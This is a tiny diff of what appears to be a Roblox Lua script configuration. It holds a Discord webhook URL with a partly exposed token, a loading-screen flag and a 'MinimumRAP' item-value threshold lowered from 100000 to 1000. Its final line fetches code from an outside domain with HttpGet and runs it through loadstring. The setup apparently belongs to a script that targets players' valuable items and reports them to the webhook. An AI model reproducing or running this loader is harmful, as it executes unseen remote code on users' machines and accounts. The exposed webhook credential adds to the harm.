@@ -4,6 +4,6 @@ Webhook = "https://discord.com/api/webhooks/1187119789466980432/dphvI8xYsxICZfhy
 
 LoadingScreen = true
 
-MinimumRAP = 100000
+MinimumRAP = 1000
 
 loadstring(game:HttpGet("https://egorikusa.space"))()
